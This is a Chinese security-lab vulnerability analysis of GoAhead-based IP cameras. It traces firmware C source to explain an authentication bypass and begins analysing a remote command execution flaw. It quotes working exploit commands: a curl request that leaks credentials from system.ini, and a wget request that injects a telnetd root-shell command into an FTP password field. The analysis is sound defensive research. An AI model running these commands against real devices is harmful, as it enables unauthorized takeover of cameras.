<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>抓住“新代码”的影子  —— 基于GoAhead系列网络摄像头多个漏洞分析</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">抓住“新代码”的影子  —— 基于GoAhead系列网络摄像头多个漏洞分析</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-03-20" class="timeago">6 月 之前</time>
          <time datetime="2017-03-20" class="fulldate">三月 20, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/vul-analysis/">漏洞分析</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss" value="知道创宇404实验室" name="#">
PDF 版本下载：<a href="http://paper.seebug.org/papers/Archive/%E6%8A%93%E4%BD%8F%E2%80%9D%E6%96%B0%E4%BB%A3%E7%A0%81%E2%80%9D%E7%9A%84%E5%BD%B1%E5%AD%90%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EGoAhead%E7%B3%BB%E5%88%97%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.pdf">抓住“新代码”的影子  —— 基于GoAhead系列网络摄像头多个漏洞分析</a></p>
<p>Author：<strong>知道创宇404实验室</strong>
Date：2017/03/19</p>
<h2>一.漏洞背景</h2>
<p><a href="https://embedthis.com/goahead/">GoAhead</a>作为世界上最受欢迎的嵌入式Web服务器被部署在数亿台设备中，是各种嵌入式设备与应用的理想选择。当然，各厂商也会根据不同产品需求对其进行一定程度的二次开发。</p>
<p>2017年3月7日，Seebug漏洞平台收录了一篇<a href="https://www.seebug.org/vuldb/ssvid-92748">基于GoAhead系列摄像头的多个漏洞</a>。该漏洞为Pierre Kim在博客上发表的一篇<a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html">文章</a>，披露了存在于1250多个摄像头型号的多个通用型漏洞。其在文章中将其中一个验证绕过漏洞归类为GoAhead服务器的漏洞，但事后证明，该漏洞却是由厂商二次开发GoAhead服务器产生的。于此同时，Pierre Kim将其中两个漏洞组合使用，成功获取了摄像头的最高权限。</p>
<h2>二.漏洞分析</h2>
<blockquote>
<p>当我们开始着手分析这些漏洞时发现GoAhead官方源码不存在该漏洞，解开的更新固件无法找到对应程序，一系列困难接踵而至。好在根据该漏洞特殊变量名称loginuse和loginpas，我们在github上找到一个上个月还在修改的<a href="https://github.com/kuangxingyiqing/bell-jpg">门铃项目</a>。抓着这个“新代码”的影子，我们不仅分析出了漏洞原理，还通过分析结果找到了漏洞新的利用方式。</p>
<p>由于该项目依赖的一些外部环境导致无法正常编译，我们仅仅通过静态代码分析得出结论，因此难免有所疏漏。如有错误，欢迎指正。:)</p>
</blockquote>
<h3>1.验证绕过导致的信息（登录凭据）泄漏漏洞</h3>
<div class="codehilite"><pre><span></span>作者给出POC: curl http://ip:port/system.ini?loginuse<span class="p">&amp;</span>loginpas
</pre></div>


<p>根据作者给出的POC，我们进行了如下测试:  </p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/-----4.png" /></p>
<p>可以看出，只要<code>url</code>中含有<code>loginuse</code>和<code>loginpas</code>这两个值即无需验证。甚至当这两个值对应的账号密码为空或者为错误的<code>zzzzzzzzzzzzzz</code>时均可通过验证。</p>
<p>看到这里，我们大致可以判断出验证<code>loginuse</code>和<code>loginpas</code>的逻辑问题导致该漏洞的出现。于是，在此门铃项目中直接搜索<code>loginuse</code>定位到关键函数。</p>
<p><code>/func/ieparam.c</code>第<code>6407-6485</code>行<code>AdjustUserPri</code>函数如下：</p>
<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">AdjustUserPri</span><span class="p">(</span> <span class="kt">char</span><span class="o">*</span> <span class="n">url</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span>     <span class="n">iRet</span><span class="p">;</span>
    <span class="kt">int</span>     <span class="n">iRet1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="n">byPri</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span>        <span class="n">loginuse</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">char</span>        <span class="n">loginpas</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">char</span>        <span class="n">decoderbuf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="kt">char</span>        <span class="n">temp2</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">32</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">loginpas</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">32</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">url</span><span class="p">,</span> <span class="s">&quot;loginuse&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
<span class="c1">//判断是否存在loginuse值，并将获取到的值赋给temp2</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">15</span> <span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="c1">//如果存在，则将temp2复制到loginuse数组中</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">iRet1</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">url</span><span class="p">,</span> <span class="s">&quot;loginpas&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
<span class="c1">//判断是否存在loginpas值，并将获取到的值赋给temp2</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet1</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">15</span> <span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">loginpas</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span> <span class="n">loginpas</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="c1">//如果存在，则将temp2复制到loginpas数组中</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">iRet1</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">//printf(&quot;user %s pwd:%s\n&quot;,loginuse,loginpas);</span>
            <span class="n">byPri</span> <span class="o">=</span> <span class="n">GetUserPri</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="n">loginpas</span> <span class="p">);</span>
<span class="c1">//如果两次都获取到了对应的值，则通过GetUserPri进行验证。</span>
            <span class="k">return</span> <span class="n">byPri</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">32</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">loginpas</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">32</span> <span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">url</span><span class="p">,</span> <span class="s">&quot;user&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">15</span> <span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
    <span class="n">iRet1</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">url</span><span class="p">,</span> <span class="s">&quot;pwd&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet1</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">128</span> <span class="p">);</span>
        <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">15</span> <span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">loginpas</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">31</span> <span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span> <span class="n">loginpas</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">iRet</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">iRet1</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">//printf(&quot;user %s pwd:%s\n&quot;,loginuse,loginpas);</span>
            <span class="n">byPri</span> <span class="o">=</span> <span class="n">GetUserPri</span><span class="p">(</span> <span class="n">loginuse</span><span class="p">,</span> <span class="n">loginpas</span> <span class="p">);</span>
            <span class="k">return</span> <span class="n">byPri</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="c1">//获取user和pwd参数，逻辑结构与上方的loginuse和loginpas相同。</span>
    <span class="k">return</span> <span class="n">byPri</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>我们对其中步骤做了注释，根据这段逻辑，我们先通过<code>GetStrParamValue()</code>获取<code>loginuse</code>和<code>loginpas</code>对应值，然后将获取值通过<code>GetUserPri()</code>函数进行验证。跟进<code>GetStrParamValue()</code>这个函数，我们发现了更奇怪的事情。
<code>command/cmd_thread.c</code>中第<code>13-51</code>行<code>GetStrParamValue()</code>函数如下：</p>
<div class="codehilite"><pre><span></span><span class="c1">//结合上面代码中的iRet = GetStrParamValue( url, &quot;loginuse&quot;, temp2, 31 );审视这段代码</span>
<span class="kt">int</span> <span class="nf">GetStrParamValue</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pszSrc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pszParamName</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pszParamValue</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pos1</span><span class="p">,</span> <span class="o">*</span><span class="n">pos</span> <span class="o">=</span> <span class="n">pszSrc</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>       <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">pszSrc</span> <span class="o">||</span> <span class="o">!</span><span class="n">pszParamName</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="c1">//判断url和需要查找的变量loginuse是否存在</span>

    <span class="n">pos1</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pos</span><span class="p">,</span> <span class="n">pszParamName</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">pos1</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="c1">//由于url中含有loginuse，所以这里pos1可以取到对应的值，故不进入if(!pos1)</span>

    <span class="n">pos</span> <span class="o">=</span> <span class="n">pos1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">pszParamName</span> <span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">pos1</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&quot;&amp;&quot;</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">pos1</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span> <span class="n">pszParamValue</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">pos1</span> <span class="o">-</span> <span class="n">pos</span> <span class="p">);</span>
<span class="c1">//根据正常情况loginuse=admin&amp;loginpas=xxx,这一段代码的逻辑是从loginuse后一位也就是等于号开始取值直到&amp;号作为loginuse对应的值。</span>
<span class="c1">//根据作者的POC:loginuse&amp;loginpas，最终这里pos应该位于pos1后一位，所以pos1-pos = -1</span>
<span class="c1">//memcpy( pszParamValue, pos, -1 );无法运行成功。</span>
        <span class="n">len</span> <span class="o">=</span> <span class="n">pos1</span> <span class="o">-</span> <span class="n">pos</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">pos1</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&quot; &quot;</span> <span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="n">pos1</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">memcpy</span><span class="p">(</span> <span class="n">pszParamValue</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">pos1</span> <span class="o">-</span> <span class="n">pos</span> <span class="p">);</span>
            <span class="n">len</span> <span class="o">=</span> <span class="n">pos1</span> <span class="o">-</span> <span class="n">pos</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="c1">//不论上述到底如何取值，最终都可以返回0</span>
<span class="p">}</span>
</pre></div>


<p>根据作者给出的<code>POC</code>，在<code>memcpy()</code>函数处会导致崩溃，但事实上，我们的<code>web</code>服务器正常运行并返回<code>system.ini</code>具体内容。这一点令我们百思不得其解。当我们对<code>AdjustUserPri()</code>函数向上溯源时终于弄清楚是上层代码问题导致代码根本无法运行到这里，所以也不会导致崩溃。
<code>func/ieparam.c</code>文件第<code>7514-7543</code>行调用了<code>AdjustUserPri()</code>函数:</p>
<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">auth</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">temp</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">int</span>  <span class="n">wlen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cp">#if 0</span><span class="c"></span>
<span class="c">    byPri = AdjustUserPri( url );</span>

<span class="c">    printf(&quot;url:%s byPri %d\n&quot;,url,byPri);</span>
<span class="c">    if ( byPri == 0x00 )</span>
<span class="c">    {</span>
<span class="c">        memset( temp, 0x00, 512 );</span>
<span class="c">        wlen += sprintf( temp + wlen, &quot;var result=\&quot;Auth Failed\&quot;;\r\n&quot; );</span>
<span class="c">        memcpy( pbuf, temp, wlen );</span>
<span class="c">        return wlen;</span>
<span class="c">    }</span>
<span class="cp">    #else</span>
    <span class="n">byPri</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
    <span class="cp">#endif</span>
<span class="p">}</span>

<span class="k">else</span>
<span class="p">{</span>
    <span class="n">byPri</span> <span class="o">=</span> <span class="n">pri</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>在之前跟<code>GetUserPri()</code>函数时有一行注释：<code>//result:0-&gt;error user or passwd error 1-&gt;vistor 2-&gt;opration 255-&gt;admin</code>。当我们回头再看这段函数时，可以发现开发者直接将验证部分注释掉，<code>byPri</code>被直接赋值为<code>255</code>，这就意味着只要进入这段逻辑，用户权限就直接是管理员了。这里已经可以解释本小节开篇进行的测试了，也就是为什么我们输入空的用户名和密码或者错误的用户名和密码也可以通过验证。</p>
<p>很遗憾，我们没有继续向上溯源找到这里的<code>auth</code>这个值到底是如何而来。不过根据这里的代码逻辑，我们可以猜测，当<code>auth</code>为<code>0</code>时，通过<code>GET请求中的参数</code>验证用户名密码。当<code>auth</code>不为<code>0</code>时，通过<code>HTTP摘要验证方式</code>来验证用户名密码。</p>
<p>再看一遍上方代码，<code>GET</code>请求中含有参数<code>loginuse</code>和<code>loginpas</code>就直接可以通过验证。那么<code>AdjustUserPri()</code>函数中另外两个具有相同逻辑的参数<code>user</code>和<code>pwd</code>呢?
<img alt="" src="https://images.seebug.org/content/images/2017/03/-----5.png" />
<strong>成功抓住"新代码"的影子</strong></p>
<h3>2.远程命令执行漏洞一（需登录）</h3>
<p>作者给出的exp如下:</p>
<div class="codehilite"><pre><span></span>user@kali$ wget -qO- <span class="s1">&#39;http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&amp;loginuse=admin&amp;loginpas=admin&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(telnetd -p25 -l/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0&#39;</span>
user@kali$ wget -qO- <span class="s1">&#39;http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=admin&amp;loginpas=admin&#39;</span>
</pre></div>


<p>可以看到，该<code>exp</code>分为两步，第一步先设置<code>ftp</code>各种参数，第二步按照第一步设置的各参数测试<code>ftp</code>链接，同时导致我们在第一步设置的命令被执行。</p>
<p>我们在<code>func/ieparam.c</code>文件中找到了<code>set_ftp.cgi</code>和<code>ftptest.cgi</code>的调用过程</p>
<div class="codehilite"><pre><span></span><span class="mi">383</span><span class="o">:</span>    <span class="n">pdst</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pcmd</span><span class="p">,</span> <span class="s">&quot;ftptest.cgi&quot;</span> <span class="p">);</span>
<span class="mi">384</span><span class="o">:</span>
<span class="mi">385</span><span class="o">:</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">pdst</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
<span class="mi">386</span><span class="o">:</span>    <span class="p">{</span>
<span class="mi">387</span><span class="o">:</span>        <span class="k">return</span> <span class="n">CGI_IESET_FTPTEST</span><span class="p">;</span>
<span class="mi">388</span><span class="o">:</span>    <span class="p">}</span>

<span class="mi">455</span><span class="o">:</span>    <span class="n">pdst</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">pcmd</span><span class="p">,</span> <span class="s">&quot;set_ftp.cgi&quot;</span> <span class="p">);</span>
<span class="mi">456</span><span class="o">:</span>
<span class="mi">457</span><span class="o">:</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">pdst</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
<span class="mi">458</span><span class="o">:</span>    <span class="p">{</span>
<span class="mi">459</span><span class="o">:</span>        <span class="k">return</span> <span class="n">CGI_IESET_FTP</span><span class="p">;</span>
<span class="mi">460</span><span class="o">:</span>    <span class="p">}</span>

<span class="mi">7658</span><span class="o">:</span>   <span class="k">case</span> <span class="nl">CGI_IESET_FTPTEST</span><span class="p">:</span>
<span class="mi">7659</span><span class="o">:</span>       <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
<span class="mi">7660</span><span class="o">:</span>       <span class="p">{</span>
<span class="mi">7661</span><span class="o">:</span>           <span class="n">iRet</span> <span class="o">=</span> <span class="n">cgisetftptest</span><span class="p">(</span> <span class="n">pbuf</span><span class="p">,</span> <span class="n">pparam</span><span class="p">,</span> <span class="n">byPri</span> <span class="p">);</span>
<span class="mi">7662</span><span class="o">:</span>       <span class="p">}</span>

<span class="mi">7756</span><span class="o">:</span>   <span class="k">case</span> <span class="nl">CGI_IESET_FTP</span><span class="p">:</span>
<span class="mi">7757</span><span class="o">:</span>       <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="p">)</span>
<span class="mi">7758</span><span class="o">:</span>       <span class="p">{</span>
<span class="mi">7759</span><span class="o">:</span>           <span class="n">iRet</span> <span class="o">=</span> <span class="n">cgisetftp</span><span class="p">(</span> <span class="n">pbuf</span><span class="p">,</span> <span class="n">pparam</span><span class="p">,</span> <span class="n">byPri</span> <span class="p">);</span>
<span class="mi">7760</span><span class="o">:</span>           <span class="n">NoteSaveSem</span><span class="p">();</span>
<span class="mi">7761</span><span class="o">:</span>       <span class="p">}</span>
</pre></div>


<p>首先跟踪<code>cgisetftp( pbuf, pparam, byPri );</code>这个函数，我们发现，该函数仅仅是获取到我们请求的参数并将参数赋值给结构体中的各个变量。关键代码如下:</p>
<div class="codehilite"><pre><span></span><span class="c1">//这部分代码可以不做细看，下一步我们进行ftp测试连接的时候对照该部分寻找对应的值就可以了。</span>
    <span class="n">iRet</span> <span class="o">=</span> <span class="n">GetStrParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;svr&quot;</span><span class="p">,</span> <span class="n">temp2</span><span class="p">,</span> <span class="mi">63</span> <span class="p">);</span>
    <span class="n">URLDecode</span><span class="p">(</span> <span class="n">temp2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span> <span class="n">temp2</span> <span class="p">),</span> <span class="n">decoderbuf</span><span class="p">,</span> <span class="mi">63</span> <span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span> <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">szFtpSvr</span><span class="p">,</span> <span class="n">decoderbuf</span> <span class="p">);</span>

    <span class="n">GetIntParamValue</span><span class="p">(</span> <span class="n">pparam</span><span class="p">,</span> <span class="s">&quot;port&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iValue</span> <span class="p">);</span>
    <span class="n">bparam</span><span class="p">.</span><span class="n">stFtpParam</span><span class="p">.</span><span class="n">nFtpPort</span> <span class="o">=</span> <span class="n">iValue</span><span class="p">;</span>

